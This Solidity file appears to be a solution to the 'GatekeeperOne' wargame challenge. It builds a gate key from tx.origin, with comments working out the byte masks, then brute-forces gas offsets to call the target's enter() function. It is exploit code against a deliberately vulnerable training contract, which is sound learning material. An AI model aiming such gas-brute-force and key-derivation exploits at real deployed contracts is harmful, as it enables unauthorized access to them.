// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneAttack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external {
        bytes8 gatekey;

        /*
        Assume gatekey = 0x8899AABBCCDDEEFF

        gateThree part one
        uint32(uint64(gatekey)) = 0xCCDDEEFF
        uint16(uint64(gatekey)) = 0xEEFF
        -> "CCDD" part should be zero

        gateThree part two
        uint32(uint64(gatekey)) = 0xCCDDEEFF
        uint64(gatekey) = 0x8899AABBCCDDEEFF
        -> "0x8899AABB" part should not be zero
        
        gateThree part three
        -> first two bytes equals to tx.origin
        -> next two bytes should be zero (already satisified at part one)
        */
        gatekey = bytes8(
            (uint64(1) << 32) | (uint64(uint160(tx.origin)) & uint64(0xFFFF))
        );

        for (uint256 i = 0; i < 8191; ++i) {
            (bool sent, ) = target.call{gas: 20000 + i}(
                abi.encodeWithSignature("enter(bytes8)", gatekey)
            );
            if (sent) {
                return;
            }
        }
    }
}
